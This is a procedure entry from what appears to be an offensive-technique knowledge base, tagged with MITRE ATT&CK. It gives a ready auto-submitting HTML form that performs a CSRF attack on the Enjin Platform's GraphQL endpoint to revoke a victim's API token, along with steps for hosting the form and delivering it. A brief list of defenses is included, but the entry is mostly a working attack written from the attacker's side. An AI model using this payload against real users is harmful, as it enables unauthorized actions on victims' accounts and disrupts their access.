---
id: proc-uuid-1
tags:
  - csrf
  - html-form
  - xsrf-bypass
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:32:39.309Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
---
# Craft-Malicious-HTML-Form-for-CSRF-Bypass

## Summary

This procedure crafts a malicious HTML form that exploits the lack of CSRF protection in the Enjin Platform's GraphQL interface, allowing a request to revoke an API token without validating the XSRF token when using session authentication.

## Description

In the Enjin Platform, the GraphQL endpoint for API token revocation does not enforce XSRF token checks for session-based requests, enabling CSRF attacks. The attacker creates an HTML form that auto-submits a GraphQL mutation to revoke the victim's token. This targets authenticated users, using their session cookie to authorize the action. Prerequisites include knowing the victim's token ID (potentially from prior recon) and delivering the HTML via a malicious link.

## Requirements

1. Knowledge of the victim's API token ID
2. Access to host HTML (e.g., attacker web server)
3. Victim must be logged in to Enjin Platform

## Defense

Defensive measures and detection strategies:

- Implement proper CSRF tokens (XSRF) for all state-changing endpoints, even session-based
- Use Content-Security-Policy (CSP) to restrict form submissions to same-origin
- Monitor for anomalous GraphQL mutations from session tokens

## Objectives

1. Bypass CSRF protection to send unauthorized revocation request
2. Disrupt victim's access by revoking their API token
3. Demonstrate vulnerability in GraphQL interface

## Instructions

### Step 1: Identify Target Endpoint and Mutation

**Context**: Determine the GraphQL mutation for token revocation and the endpoint URL.

From Enjin docs or recon, the endpoint is https://platform.enjin.io/graphql, and the mutation is revokeApiToken.

### Step 2: Build the HTML Form

**Context**: Create an auto-submitting form with the malicious GraphQL query.

Replace VICTIM_TOKEN_ID with the actual ID.

```html
<!DOCTYPE html>
<html>
<body>
  <form id="csrf-revoke" action="https://platform.enjin.io/graphql" method="POST">
    <input type="hidden" name="query" value='mutation { revokeApiToken(input: {tokenId: "VICTIM_TOKEN_ID"}) { success } }'>
  </form>
  <script>document.getElementById('csrf-revoke').submit();</script>
</body>
</html>
```

> This form posts the mutation directly, relying on the browser's session cookie for auth. Expected output: Silent submission; check network tab for 200 OK from GraphQL.

### Step 3: Host and Test the Form

**Context**: Serve the HTML and verify it triggers the revocation without XSRF errors.

Host on a server (e.g., via Python: python -m http.server) and load in a test authenticated session.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[graphql]]
- [[xsrf-bypass]]
